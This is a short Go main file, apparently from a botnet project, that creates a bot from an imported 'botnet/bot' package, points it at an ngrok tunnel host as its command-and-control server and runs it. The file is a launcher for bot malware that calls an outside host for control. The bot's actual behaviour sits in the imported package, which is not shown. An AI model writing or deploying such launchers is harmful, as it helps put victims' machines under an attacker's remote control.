package main

import (
	"log"

	"github.com/adrianosela/botnet/bot"
)

func main() {
	b, err := bot.NewBot("7a18d232.ngrok.io")
	if err != nil {
		log.Fatal(err)
	}
	b.Run()
}
